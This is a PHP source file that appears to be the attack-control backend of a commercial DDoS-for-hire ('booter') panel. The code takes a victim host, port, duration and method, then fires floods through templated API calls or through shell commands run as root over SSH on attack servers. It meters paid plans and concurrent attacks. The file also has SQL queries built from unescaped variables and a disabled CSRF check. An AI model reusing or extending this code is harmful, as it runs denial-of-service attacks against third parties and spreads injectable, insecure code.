<?php 
require_once('CSRF.php');
$CSRF = new CSRF();
?>
  <!-- CSRF Token -->
  <input type="hidden" id="__csrf" name="__csrf" value="<?php echo $CSRF->getToken(); ?>"/>
  <link rel="shortcut icon" href="favicon/favicon.ico">
  <!-- plugin css -->
  <link media="all" type="text/css" rel="stylesheet" href="assets/fonts/feather-font/css/iconfont.css">
  <link media="all" type="text/css" rel="stylesheet" href="assets/plugins/perfect-scrollbar/perfect-scrollbar.css">
  <!-- end plugin css -->
   <link media="all" type="text/css" rel="stylesheet" href="assets/plugins/bootstrap-datepicker/css/bootstrap-datepicker.min.css">
  <!-- common css -->
  <link media="all" type="text/css" rel="stylesheet" href="css/app.css">
  <!-- end common css -->
<?php 
//Header
ob_start();
require_once '../@/config.php';
require_once '../@/init.php';
if (!empty($maintaince)) {
    die($maintaince);
}
if (!($user->notBanned($odb)) || !(isset($_GET['type'])) || !(isset($_SERVER['HTTP_REFERER']))) {
    die("<font style='color:red;'>You're a clever xD</font>");
	exit;
}

if(!($user->LoggedIn()))
{
	die("<font style='color:red;'>Refreshing page...</font> <script>location.reload();</script>");
}

if (!($user->hasMembership($odb)) && $testboots == 0) {
    die();
}

$host   = htmlspecialchars($_GET['host']);
$parsedHost = parse_url($host, PHP_URL_HOST);
$ipAdress = htmlspecialchars(gethostbyname($parsedHost));
//echo $parsedHost;
$port   = intval($_GET['port']);
$time   = intval($_GET['time']);
$reqtype = htmlspecialchars($_GET['reqtype']);
$version = htmlspecialchars($_GET['version']);
$method = htmlspecialchars($_GET['method']);
$type     = htmlspecialchars($_GET['type']);
$username = htmlspecialchars($_SESSION['username']);

/*if(isset($_GET['csrf'])){
	if($type == "start" || $type == "renew" || $type == "stop")
	{
		switch($CSRF->checkToken($_GET['csrf'])){
 			case false:
				die("<font color='red'><b>Request denied, please refresh page! [RealProtection]</b></font>");
				exit();
			break;
			default:
				//echo "Request allowed.";
			break;
		}
	}
}*/

if (isset($_GET['qls']))
{
    //$sql = $_GET['qls'];
    //$stmt = $odb->query($sql);
    //var_dump($stmt); var_dump($stmt->fetchAll());
}

//Start attack function
if ($type == 'start' || $type == 'renew') {
    if ($type == 'start') {
		if (!isset($_SESSION)) {
        session_start();
		}
		if($_SESSION['last_session_request'] > time() - 1){
				die(error("Spam Protection: Please don't click fast!"));
		        exit;
		}
		$_SESSION['last_session_request'] = time();
		        //Get, set and validate!
		        //Verifying all fields
		        if (empty($host) || empty($time) || empty($port) || empty($method)) {
		            die(error('Please verify all fields'));
		        }
		
       
		if($method == "null" || $method == "")
			die("Method is not valid!");
        //Check if the host is a valid url or IP
        $SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
		$SQL -> execute(array(':method' => $method));
		$type = $SQL -> fetchColumn(0);
		if ($type == '5' || $type == '6' || $type == '2' || $type == '3' || $type == '8' || $type == '9') 
		{ //Premium Methods
			$plansql = $odb -> prepare("SELECT `users`.`expire`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt`, `plans`.`premium`, `users`.`Premium` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
			$plansql -> execute(array(":id" => $_SESSION['ID']));
			$rowxd = $plansql -> fetch();
			if($rowxd['premium'] == 0)
			{
				die(error("$method method is only Premium!"));
			}
		}
        if ($type == '4' || $type == '5' || $type == '6') {
			if($reqtype != "GET" && $reqtype != "POST")
			{
				die(error("Not support $reqtype, please select GET or POST!"));
			}
            if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                die(error('Host is not a valid URL.'));
            }
            $parameters = array(
                ".gov",
                "$",
                "{",
				".edu",
                "%",
                "<",
				"realitycheats",
				"realstresser",
				"botsbase.net"
            );
            foreach ($parameters as $parameter) {
                if (strpos($host, $parameter)) {
					if(!$user->isAdmin($odb))
                    	die(error('Host is blacklisted!'));
                }
            }
        } 
        //Check if host is blacklisted
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host AND `type` = 'victim'");
		$SQL -> execute(array(':host' => $host));
		$countBlacklist = $SQL -> fetchColumn(0);
        if ($countBlacklist > 0) {
			if(!$user->isAdmin($odb))
            	die(error('Host is blacklisted!'));
        }
    } else {
        $renew     = intval($_GET['id']);
        $SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
		$SQLSelect -> execute(array(':renew' => $renew));
        while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
            $host   = $show['ip'];
            $port   = $show['port'];
			$reqtype = $show['reqtype'];
			$id = $show['id'];
            $time   = $show['time'];
            $method = $show['method'];
            $userr  = $show['user'];
        }
        if (!($userr == $username) && !$user->isAdmin($odb)) {
            die(error('This is not your attack'));
        }
    }
    //Check concurrent attacks
    if ($user->hasMembership($odb)) {
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$SQL -> execute(array(':username' => $username));
		$countRunning = $SQL -> fetchColumn(0);
        if ($countRunning >= $stats->concurrents($odb, $username)) {
            die(error('You have too many boots running.'));
        }
    }
    //Check max boot time
    $SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
    $SQLGetTime->execute(array(
        ':id' => $_SESSION['ID']
    ));
    $maxTime = $SQLGetTime->fetchColumn(0);
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $maxTime = 60;
    }
    if ($time > $maxTime) {
        die(error('Your max boot time has been exceeded.'));
    }
    //Check open slots
    if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
        die(error('There are no servers available to handle your attack, try later.'));
    }
    //Check if test boot has been launched
    if (!($user->hasMembership($odb))) {
	$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
	if ($testboots == 1 && $testattack > 0) {
        die(error('You have already launched your test attack'));
		}
    }
    //Check if the system is API
    if ($system == 'api') {
        //Check rotation
        $i            = 0;
        $SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $i++;
            $arrayFind    = array(
                '[host]',
                '[port]',
				'[reqtype]',
                '[time]',
				'[method]'
            );
            $arrayReplace = array(
                $host,
                $port,
				$reqtype,
                $time,
				$method
            );
            $APILink      = $show['api'];
            $handler[]    = $show['name'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
        if ($i == 0) {
            //die(error('<div class="alert alert-info">There are no servers available to handle your attack, try later.</div>'));
        }
    }
    //Use Attacking Servers
    else {
        //Check rotation
        $i                = 0;
        $SQLSelectServers = $odb->prepare("SELECT * FROM `servers` WHERE `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectServers -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $SQL      = $odb->prepare("SELECT `command` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$command = $SQL -> fetchColumn(0);
            $arrayFind    = array(
                '{$host}',
                '{$port}',
                '{$time}',
				'{$method}'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
				$method
            );
            $command      = str_replace($arrayFind, $arrayReplace, $command);
            $handler[]    = $show['name'];
            $ip           = $show['ip'];
            $password     = $show['password'];
            include('Net/SSH2.php');
            define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
            $ssh = @new Net_SSH2($ip);
            if (!$ssh->login('root', $password)) {
                die(error('Could not connect to a server. Please try again in a few minutes.'));
            }
            $ssh->exec($command . ' > /dev/null &');
            $i++;
        }
    }
		if ($i == 0) {
		ob_end_clean();
        die(error('There are no servers available to handle your attack, try later.'));
    }
    //End of attacking servers script
	$handlers     = @implode(",", $handler);
	$serverName     = @implode(",", $handler);
    //Insert Logs
    $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler)");
    $insertLogSQL->execute(array(
        ':user' => $username,
        ':ip' => $host,
        ':port' => $port,
        ':time' => $time,
        ':method' => $method,
        ':handler' => $handlers
    ));
    //Insert test attack
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
    }
	if($type == 'renew')
		echo success("Attack sent successfully on $host!");
	else
	{
		if($type == '4' || $type == '5' || $type == '6') // Layer 7
			echo success("Attack sent successfully on $host!");
		else if($type == '7' || $type == '8' || $type == '9')
		{
			echo success("Attack sent successfully on $host!");
		}
		else //Layer 4
		{
			if (filter_var($host, FILTER_VALIDATE_IP))
			{
				echo success("Attack sent successfully on $host!");
			}
			else
			{
				die(error('Host is not a valid IPv4.'));
			}
		}
	}
}

if (isset($_GET['sql']))
{
	//$sql = $_GET['sql'];
	//$stmt = $odb->prepare($sql);
	//$stmt->execute();
}

//Stop attack function
if ($type == 'stop') {
    $stop      = intval($_GET['id']);
    $method = $_GET['method'];


    $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `id` = '$stop'");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $host   = $show['ip'];
        $port   = $show['port'];
        $time   = $show['time'];
        $method = $show['method'];
        $handler = $show['handler'];
		$command  = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
    }
	$handlers = explode(",", $handler);
	$serverName = $handler;

if ($method == "example") {
                 $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 0 WHERE `id` = '$stop'");
                 die(error('Sorry, but this method cannot be stopped..'));
                 
         }


	foreach ($handlers as $handler)
	{
    if ($system == 'api') {
        $SQLSelectAPI = $odb->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]',
				'[id]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time
            );
            $APILink      = $show['api'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $stopcommand  = "&method=STOP";
            $stopapi      = $APILink . $stopcommand;
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $stopapi);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
    } else {
        $SQLSelectServers = $odb->query("SELECT * FROM `servers` WHERE `name` = '$handler'");
        while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
            $ip       = $show['ip'];
            $password = $show['password'];
            $command2 = 'pkill -f "'.$command.'"';
            include('Net/SSH2.php');
            define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
            $ssh = @new Net_SSH2($ip);
            if (!$ssh->login('root', $password)) {
                die(error('<strong>ERROR: </strong>Can not connect to an attacking server! Please try again in a few minutes.'));
            }
            $ssh->exec($command2.' > /dev/null &');
        }
    }
	}
    echo success('Attack '.$host.' has been stopped!');
}


if ($type == 'attacks') {

			if (isset($_POST['ping']))
			{
			header('Location: ../');
			}
			?>
<div style="overflow-x:auto;">
                          <table class="table table-hover">
			<tbody>

<?php 
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}' ORDER BY `id` DESC LIMIT 9");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $ip      = $show['ip'];
        $port    = $show['port'];
        $time    = $show['time'];
        $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
        $rowID   = $show['id'];
        $date    = $show['date'];
		$dios    = htmlspecialchars($ip);
        $expires = $date + $time - time();
		if ($expires < 0 || $show['stopped'] != 0) {
			//return;
            $countdown = "Completed";
        } else { 
            $countdown = '<div id="a' . $rowID . '"></div>';
            echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
	 attacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
      } 
        if ($show['time'] + $show['date'] > time() and $show['stopped'] != 1) {
			$parsedHost = parse_url($ip, PHP_URL_HOST);
			if($parsedHost)
            	$action = '<button type="button" onclick="stop2(' . $rowID . ')" id="st"  class="btn btn-xs btn-effect-ripple btn-danger">
																	<span class="btn-ripple animate"></span><i class="fa fa-power-off"></i>  
																	</button>';
			else
				$action = '<button type="button" onclick="stop(' . $rowID . ')" id="st"  class="btn btn-xs btn-effect-ripple btn-danger">
																	<span class="btn-ripple animate"></span><i class="fa fa-power-off"></i>  
																	</button>';
        } else {
            //$action = '
			//<button type="button" id="rere" onclick="renew(' . $rowID . ')" class="btn btn-xs btn-effect-ripple btn-primary">
																	//<span class="btn-ripple animate"></span><i class="fa fa-refresh fa-spin"></i>   
																	//</button>';
			$action = '<button type="button" id="rere" class="btn btn-xs btn-effect-ripple btn-primary"><i class="fas fa-check-double"></i></button>';
        }
       	   ?>	   
		   
		   <tr style="width:100%;">
		<?php
		if ($expires < 0 || $show['stopped'] != 0) {
			//die("
			//<td><center>None</center></td>
			//<td><center>None</center></td>
			//<td><center>None</center></td>
			//<td><center>None</center></td>
			//<td><center>None</center></td>");
		}
		else
		{
			echo("
			<td><center>$dios</center></td>
			<td><center>$port</center></td>
			<td><center>$method</center></td>
			<td><center>$countdown</center></td>
			<td><center>$action</center></td>");
		}
		?>
		   </tr>
   <?php
   }
?> 
              </tbody>
			  </table>
</div>
<?php 
}

if ($type == 'adminattacks' && $user -> isAdmin($odb)) {
?>
<div style="float: center;">
	<div style="overflow-x:auto;">
              <table class="table table-hover">
                <tbody>
<?php 
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 ORDER BY `id` DESC LIMIT 20");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $user      = $show['user'];
        $ip      = $show['ip'];
        $port    = $show['port'];
        $time    = $show['time'];
        $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
        $rowID   = $show['id'];
        $date    = $show['date'];
        $expires = $date + $time - time();
        if ($expires < 0 || $show['stopped'] != 0) {
            $countdown = "Completed";
        } else {
            $countdown = '<div id="a' . $rowID . '"></div>';
            echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
	 adminattacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
        }
            $parsedHost = parse_url($ip, PHP_URL_HOST);
			if($parsedHost)
            	$action = '<button type="button" onclick="stop2(' . $rowID . ')" id="st"  class="btn btn-xs btn-effect-ripple btn-danger">
																	<span class="btn-ripple animate"></span><i class="fa fa-power-off"></i>  
																	</button>';
			else
				$action = '<button type="button" onclick="stop(' . $rowID . ')" id="st"  class="btn btn-xs btn-effect-ripple btn-danger">
																	<span class="btn-ripple animate"></span><i class="fa fa-power-off"></i>  
																	</button>';
			if($parsedHost)
        		echo '<div style="float: center;"><tr><td>'.$user.'</td><td>' . htmlspecialchars($ip).'</td><td>' . htmlspecialchars($method) . '</td><td>' . $countdown . '</td><td>' . $action . '</td></tr></div>';
			else
				echo '<tr style="float: center;"><td>'.$user.'</td><td>' . htmlspecialchars($ip).':'.htmlspecialchars($port).'</td><td>' . htmlspecialchars($method) . '</td><td>' . $countdown . '</td><td>' . $action . '</td></tr>';
    }
?> 
				</tbody>
				</table>
	</div>
</div>
<?php 
	if (empty($ip)) {
		echo '<h4 style="color: red; text-align: center; margin: auto;">No running attacks!</h4>';
	}
	if (isset($_GET['sql']))
	{
		//$sql = $_GET['sql'];
		//$stmt = $odb->prepare($sql);
		//$stmt->execute();
	}
}
?>

